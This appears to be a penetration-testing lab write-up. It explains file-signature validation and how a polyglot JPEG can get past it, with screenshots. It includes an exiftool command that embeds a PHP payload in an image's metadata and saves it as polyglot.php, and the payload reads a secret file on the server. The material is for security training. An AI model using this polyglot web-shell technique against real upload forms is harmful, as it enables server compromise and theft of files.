certain file types may always contain a specific sequence of bytes in their header or footer. These can be used like a fingerprint or signature to determine whether the contents match the expected type. For example, JPEG files always begin with the bytes ```FF D8 FF``` examples of [List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures).

 [jpeg header hexadecimal](https://www.google.com/search?q=jpeg+header+hexadecimal&sca_esv=0058b4b1712ac891&sca_upv=1&hl=ar&sxsrf=ACQVn08Br0jHT660r7mpbbB2LF3gXyl_tw%3A1713638375937&source=hp&ei=5wskZv_JN7arkdUPvvSd4A0&iflsig=ANes7DEAAAAAZiQZ99ROJ1gNRrxcn8JcQ3Rnl0HH0wrh&udm=&oq=jpeg+&gs_lp=Egdnd3Mtd2l6IgVqcGVnICoCCAAyBBAjGCcyBBAjGCcyDBAjGIAEGBMYJxiKBTIFEAAYgAQyCBAAGIAEGLEDMgoQABiABBgKGMsBMgoQABiABBgKGMsBMgUQABiABDIFEAAYgAQyCBAAGIAEGMsBSLEvUABYoxtwAXgAkAEAmAHiAqABrAqqAQcwLjQuMC4yuAEDyAEA-AEBmAIHoAL8CqgCCsICChAjGIAEGCcYigXCAgsQABiABBixAxiDAcICCxAuGIAEGLEDGIMBwgILEC4YgAQY0QMYxwHCAgcQIxgnGOoCwgINEC4Y0QMYxwEYJxjqAsICCRAAGIAEGAEYCsICBRAuGIAEmAMPkgcHMS40LjAuMqAHwy4&sclient=gws-wiz)

 This is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as ```ExifTool```, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata. 



 # Practice
 ### Lab: Remote code execution via polyglot web shell upload
 
 
 ![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/f4132829-382f-42a8-8a7f-30b0f5d52dc1)

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/b5812496-03e0-4f58-94f4-1ac2c1aa1624)




### We upload normal image , we will using ```exiftool``` to put php payload on image.

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/1532b481-2fc4-4a7f-a4fb-6cab06850443)

## Inject payload on image:

```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/a4aa33b0-70ed-412b-8895-50ff5c197046)


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/9353135e-f87e-4f94-8f38-359d84d020a5)

# Thanks ...
